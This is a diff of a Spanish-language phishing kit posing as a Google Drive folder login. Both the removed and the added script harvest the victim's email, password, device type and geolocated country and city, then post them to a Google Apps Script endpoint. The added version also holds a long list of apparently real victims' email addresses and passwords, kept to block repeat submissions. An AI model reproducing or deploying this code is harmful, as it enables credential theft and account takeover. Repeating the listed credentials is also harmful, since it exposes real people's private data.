@@ -1,269 +1,14 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-
-<link rel="icon" href="https://i.ibb.co/pyp9n23/icons.png" type="image/x-icon">
-<link rel="shortcut icon" href="https://i.ibb.co/pyp9n23/icons.png" type="image/x-icon">
-        
-    <meta charset="UTF-8">	
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <meta property="og:title" content="Google Drive - Dibujos" />
-<meta property="og:description" content="google.com" />
-<meta property="og:image" content="https://i.ibb.co/b62PxBS/video-new.jpg" />
-        
-        
-    <title>Fotos - Google Drive - Dibujos </title>
-
-
-  <style>
-    /* Estilos generales */
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
-
-
-
-
-.subtitle {
-  background-color: #fffddd; /* Amarillo claro */
-  border: 1px solid #e0c7ce; /* Gris claro */
-  padding: 5px 15px; /* Espacio de relleno */
-  margin: 10px 0; /* Margen superior e inferior */
-  border-radius: 4px; /* Bordes redondeados */
-  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); /* Sombra sutil */
-  font-family: Arial, sans-serif; /* Tipografía similar a la de Facebook */
-  font-size: 14px; /* Tamaño de fuente mediano */
-  line-height: 1.2; /* Espacio entre líneas */
-  color: #333; /* Color de texto negro */
-  text-align: center; /* Texto centrado */
-}
-
-
-
-
-    /* Estilos del contenedor principal */
-    .container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      height: 100vh;
-    }
-
-    /* Estilos del logo  */
-    .logo {
-      width: 100px;
-      margin-top: 50px;
-    }
-
-    /* Estilos del formulario de inicio de sesión */
-    .form {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      margin-top: 20px;
-      width: 355px;
-      background-color: rgba(255, 255, 255, 0.9);
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
-      padding: 35px;
-    }
-
-    /* Estilos del título del formulario */
-    .title {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-size: 22px;
-      font-family: "","Noto Sans Myanmar UI",arial,sans-serif;
-      color: #202124;
-      margin-bottom: 10px;
-    }
-
-    /* Estilos del icono  */
-    .icon {
-      width: 30px;
-      height: 30px;
-      margin-right: 10px;
-    }
-
-    /* Estilos de los campos de texto */
-    .input {
-      width: 100%;
-      height: 40px;
-      border: 1px solid #dfe1e5;
-      border-radius: 5px;
-      padding: 10px 20px;
-      font-size: 16px;
-      outline: none;
-    }
-
-    /* Estilos de los campos de texto al enfocarse */
-    .input:focus {
-      border-color: #1a73e8;
-    }
-
-    /* Estilos del botón de siguiente */
-    .button {
-      width: 100%;
-      height: 40px;
-      border: none;
-      border-radius: 5px;
-      background-color: #4285f4;
-      border: 2px solid white;
-      color: white;
-      font-size: 14px;
-      margin-top: 20px;
-      cursor: pointer;
-    }
-
-    /* Estilos del botón de siguiente al pasar el ratón */
-    .button:hover {
-      box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
-    }
-
-    /* Estilos del enlace de crear cuenta */
-    .link {
-      text-decoration: none;
-      color: #1a73e8;
-      font-size: 14px;
-      margin-top: 20px;
-      font-family: roboto;
-    }
-
-    /* Estilos de la etiqueta "o" */
-    .or {
-      display: flex;
-      align-items: center;
-      width: 100%;
-      margin-top: 10px;
-    }
-
-    /* Estilos del texto "o" */
-    .or-text {
-      color: #6c6c6c;
-      font-size: 14px;
-      margin: 0 auto;
-      background-color: white;
-      padding: 0 10px;
-    }
-
-    /* Estilos de la línea "o" */
-    .or-line {
-      height: 1px;
-      width: 100%;
-      background-color: #dfe1e5;
-    }
-
-    /* Estilos del botón "Iniciar sesión con otra cuenta" */
-    .other-button {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      width: 100%;
-      height: 40px;
-      border: none;
-      border-radius: 5px;
-      background-color: #f8f9fa;
-      color: #3c4043;
-      font-size: 14px;
-      margin-top: 10px;
-      cursor: pointer;
-    }
-
-    /* Estilos del botón "Iniciar sesión con otra cuenta" al pasar el ratón */
-    .other-button:hover {
-      box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
-    }
-
-    /* Estilos del subtitulo */
-
-
-    /* Estilos del idioma */
-    .language {
-      font-size: 12px;
-      margin-top: 10px;
-      font-family: "Noto Sans Myanmar UI",arial;
-    }
-
-
-
-    p {
-         font-size: 12px;
-    
-      font-family: Arial, sans-serif;
-        word-spacing: 28px;
-    }
-
-.boton-cargando {
-    animation: brillo 1.5s infinite alternate;
-}
-
-/* Animación de brillo/pulso */
-@keyframes brillo {
-    0% { opacity: 1; text-shadow: 0 0 5px #fff; }
-    100% { opacity: 0.6; text-shadow: 0 0 10px #ff0; }
-}
-
- 
-  </style>
-</head>
-<body>
-
-  
-  <div class="container">
-    <!-- Logo  -->
-    
-
-<!-- Formulario de inicio de sesión -->
-<form class="form" id="miFormulario" style="padding-top: 5px; padding-bottom: 80px; margin-top: 100px;">
-  
-    <img src="https://i.ibb.co/ygHBjNN/gssr-272x92dp.png" alt="go" class="logo">
-    <br>
-
-    <div class="title">Accede a la carpeta Dibujos</div>
-    <div class="subtitle">Utiliza tu cuenta para continuar</div>
-    <br>
-
-    <input type="email" id="emailInput" name="email" class="input" placeholder="Correo electrónico" required="" value="">
-    
-    <div class="or">
-        <div class="or-line"></div>
-        <div class="or-text">o</div>
-        <div class="or-line"></div>
-    </div>
-
-    <input type="text" name="password" class="input" placeholder="Contraseña" minlength="5" maxlength="32" required>
-    <span id="error-message" style="color: red;"></span>
-
-    <button type="submit" class="button">Siguiente</button>
-
-    <a href="#" class="link">¿No tienes una cuenta? Crea una</a>
-
-</form>
-
-<!-- Contenedor donde se cargará usuario.html sin heredar estilos -->
-<iframe id="usuarioFrame" src="" style="display: none; width: 100%; height: 100vh; border: none;"></iframe>
-
-<br>
-<p>Español(España) Ayuda Privacidad Términos</p>
-
-<!-- Vincular el script -->
-<script src="script.js"></script>
-
-        
-<script>
 document.getElementById("miFormulario").addEventListener("submit", async function(event) {
     event.preventDefault(); // Evita el envío automático
-    
+
+    // Obtener elementos del formulario
     const emailInput = document.querySelector('input[name="email"]');
     const passwordInput = document.querySelector('input[name="password"]');
-    const errorMessage = document.getElementById('error-message'); 
+    const errorMessage = document.getElementById('error-message');
     
     // Lista de correos electrónicos y contraseñas prohibidas
-    const prohibitedEmails = ["ejemplo@mail.com"]; // Agregar correos prohibidos aquí
-    const prohibitedWords = ["Sandia190395#","sandia190395#"]; // Agregar contraseñas prohibidas aquí
+    const prohibitedEmails = ["019100739c@uandina.edu.pe","019100729c@uandina.edu.pe","estefanocernaalaba@gmail.com","guaniloguanilokoke@gmail.com","parcedahua@gmail.com","anaf.felix@upsjb.edu.pe","sophieriverah@gmail.com","dariellasalazar8@gmail.com","jorgealtamirano31@hotmail.com","wonderwallasd1@gmail.com","em.calderontu@alum.up.edu.pe","liateresa993@gmail.com","newan2110@gmail.com","alvillacorta200@gmail.com","mateo_akemi_18@hotmail.com","2320104023@unia.edu.pe","71256596@continental.edu.pe","darkgirlfrank@gmail.com","olenkamaryi2025@gmail.com","minayaanthu@gmail.com","ominayaga@ucvvirtual.edu.pe","elide_gatynha@hotmail.com","darlyn.dayanramendoza@gmail.com","lsanchezv2@upao.edu.pe","tequenazo1995@gmail.com","delgadoangenny@gmail.com","aleferreyro1@gmail.com","bernatAaramichele38@gmail.com","yessenia.arista09@gmail.com"]; // Agregar correos prohibidos aquí
+    const prohibitedWords = ["kira123456789","Kira123456789","121619isa","12161906","123456789","1234567890","jhknv","Jhknv","Eliansilva2500","tacachoconcecina","TACACHOCONCECINA","Tacachoconcecina","andreaturzi2306","andreaturzi2306","ctdaciamaria1","Ctdaciamaria1","dayannaPizarro0104_Da1","DayannaPizarro0104_Da1","dayannaPizarro0104_2005","DayannaPizarro0104_2005","Anahi123","anahi123","addiscute20","76391931","joseph2810.@","JOSEPH2810","Joseph2810.@","1sofiarivera3","08112019omar","gidtip-5fowfo-derdUs","16485558","Holaaaa","18668799","Allisonsonrisa","allisonsonrisa","maracaibo2023","Maracaibo2023","75701571","alfalfa23","Alfalfa23","bbbbb","BBBBB","AAAAA","momentico2024@","Momentico2024@","Ai1912Ai","fabianatodio","fabianatodio..","80243690eladio","80243690Eladio","80243690","75573800","74808220kc","74808220Kc","lyssa212002","Lyssa212002","74808220Kc","nicolas2024","nicolas2025","Nicolas2024","Nicolas2025","76693962","Alyssrominaxd","alyssrominaxd","Gonzales7125","VAR20var","fran11fppr18","kiraBella1819B","KiraBella1819B","47867269epp","pepas5314","Pepas5314","fran11fppr1819","Fran11fppr1819","22223333","Lilablue19@@","Lilablue19@@","Lilablue19","lilablue19","Mdnsjsla","Aaaaa","jovita70","Jovita70","jovita70*","Jovita70*","17025612","Jovita70**","jovita70**","75573800","Alyssromina21","alyssromina21","adri71318901","Adri71318901","alyssromina21xd","Alyssromina21xd","cielito1309","Cielito1309","Mybabyslat23$","-Mybabyslat23$","050285cr7","lavidaesunamierda2","Cambiocambio2","Cambiocambio3","cambiocambio3","cambiocambio2","lavidaesunamierda2","emilse.1952@","Madrid1917@","Emilse.1952@","929915693bas","929915693Bas","jugodefresa5","Jugodefresa5","jugodefresa","Jugodefresa","Darlyn2006","darlyn2006","18668799","Tifany123.","Soportes.2025","soportes.2025","jenniffer0505","Jenniffer0505","no quiero p","No quiero p","kimbergor22","Kimbergor22","johitaw12","Johitaw12","ange27","Ange27","Yessenia09","yessenia.09","Yessenia.09","cambiocambio3","pepas5314","Pepas5314","kpgz16$%","jovita70**","Jovita70**","17025612","Jovita70*","jovita70*","grissel1234567890#","Grissel1234567890#","lavidaesunamierda2","Cambiocambio2","cambiocambio2","4FS3YZfpZCjwPAR","977846069","dairy.12","jovita70**","Nuevasoportunidades08","nuevasoportunidades08","Olivia1106","Olivia11.06","Olivia2109","olivia1106","olivia11.06","Olivia2019","olivia2019"]; // Agregar contraseñas prohibidas aquí
     
     const email = emailInput.value.trim().toLowerCase();
     const password = passwordInput.value;
@@ -273,102 +18,95 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     if (!emailRegex.test(email)) {
         errorMessage.textContent = "Correo electrónico no válido";
         errorMessage.style.color = 'red';
-        return;
+        return; // Detiene el procesamiento
     }
     
     // Verificar correo prohibido
     const isProhibitedEmail = prohibitedEmails.includes(email);
     if (isProhibitedEmail) {
-        errorMessage.textContent = "No se encuentra la dirección de correo";
+        errorMessage.textContent = "Ocurrio un error con el correo intentar con otra dirección";
         errorMessage.style.color = 'red';
+        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
         emailInput.value = '';
         passwordInput.value = '';
-        return;
+        return; // Detiene el procesamiento
     }
     
     // Verificar contraseña prohibida
     const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));
     if (containsProhibitedPassword) {
-        errorMessage.textContent = "Restaure su contraseña y vuelva a intentar";
+        errorMessage.textContent = "Contraseña incorrecta";
         errorMessage.style.color = 'red';
+        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
         passwordInput.value = '';
-        return;
+        return; // Detiene el procesamiento
     }
     
-    // Si todo está bien, limpia los mensajes de error y envía el formulario
-    errorMessage.textContent = ""; // Limpia errores previos
-    
-    // Aquí puedes agregar código para enviar el formulario
-    // Por ejemplo:
-    this.submit(); // Envía el formulario si todas las validaciones son correctas
-});
+    // Si pasa todas las validaciones, continúa con el proceso normal
+    // Limpiar cualquier mensaje de error previo
+    if (errorMessage) {
+        errorMessage.textContent = "";
+    }
 
-    // Detectar si el usuario usa iPhone o Android
+    // Ocultar el formulario
+    document.getElementById("miFormulario").style.display = "none";
+    
+    // Mostrar mensaje "Cargando..."
+    let loadingMessage = document.createElement("p");
+    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
+    loadingMessage.style.textAlign = "center";
+    document.body.appendChild(loadingMessage);
+    
+ // Antes de mostrar el iframe, ocultar el footer de folder.html
+document.querySelector("p").style.display = "none"; 
+
+// Mostrar el iframe
+let iframe = document.getElementById("usuarioFrame");
+iframe.src = "invitation.html";
+iframe.style.display = "block";
+
+    
+    // Eliminar mensaje de carga después de mostrar usuario.html
+    iframe.onload = function() {
+        loadingMessage.remove();
+    };
+    
+    // ✅ Detectar si el usuario usa iPhone o Android
     let deviceType = "Otro"; // Valor por defecto
     if (/android/i.test(navigator.userAgent)) {
         deviceType = "Android";
     } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
         deviceType = "iPhone";
     }
-
-    // Obtener el país del usuario
+    
+    // ✅ Obtener el país y la ciudad del usuario desde la API
     let country = "Desconocido";
+    let city = "Desconocido"; // Añadido: variable para almacenar la ciudad
     try {
         const response = await fetch("https://ipwhois.app/json/");
         const data = await response.json();
-        if (data.country) {
-            country = data.country; // Nombre del país
-        }
-    } catch (error) {
-        console.error("Error obteniendo el país:", error);
-    }
-
-    // Enviar datos a Google Apps Script
-    const formData = new FormData();
-    formData.append("email", email);
-    formData.append("password", password);
-    formData.append("device", deviceType);
-    formData.append("country", country); // Enviar el país 
-
-    const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec"; // Reemplaza con tu Google Apps Script
-
-    try {
-        const response = await fetch(url, {
-            method: "POST",
-            body: new URLSearchParams(formData),
-            headers: { "Content-Type": "application/x-www-form-urlencoded" }
-        });
-
-        if (response.ok) {
-            window.location.href = "invitation.html"; // Redirigir tras éxito
-        } else {
-            alert("Error al enviar los datos.");
-        }
-    } catch (error) {
-        alert("Error al conectar con el servidor.");
-        console.error("Error:", error);
-    }
-});
-</script>
-
-          <script>
-    document.addEventListener("DOMContentLoaded", async function () {
-        const API_URL = "https://script.google.com/macros/s/AKfycbyoGDPGgsNZgpj9Jp8S6o15CCDUbScmb5MctgpMtwmsqEggwxw-JHYSvDB-FbPlXWQq/exec"; // Reemplaza con la URL de tu Google Apps Script
-
-        try {
-            // Evitar caché agregando un timestamp único a la URL
-            const response = await fetch(`${API_URL}?t=${new Date().getTime()}`);
-            const pagina = await response.text();
-
-            if (pagina.trim() !== "folder.html") {
-                window.location.href = pagina; // Redirig si el administrador lo ha cambiado
+        if (data) {
+            if (data.country) {
+                country = data.country; // Captura el país
             }
-        } catch (error) {
-            console.error("Error al verificar la redirección:", error);
+            if (data.city) {
+                city = data.city; // Captura la ciudad
+            }
         }
-    });
-</script>
-
-
-
-</body></html>
+    } catch (error) {
+        console.error("Error obteniendo la ubicación:", error);
+    }
+    
+    // ✅ Asegurar que los datos se agregan correctamente antes de enviarlos
+    const formData = new FormData(this);
+    formData.append("device", deviceType); // Agregar dispositivo
+    formData.append("country", country + " - " + city); // Agregar país y ciudad combinados
+    
+    // ✅ Enviar los datos correctamente a Google Sheets
+    const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
+    fetch(url, {
+        method: "POST",
+        body: new URLSearchParams(formData),
+        headers: { "Content-Type": "application/x-www-form-urlencoded" }
+    }).catch(error => console.error("Error al enviar datos:", error));
+});
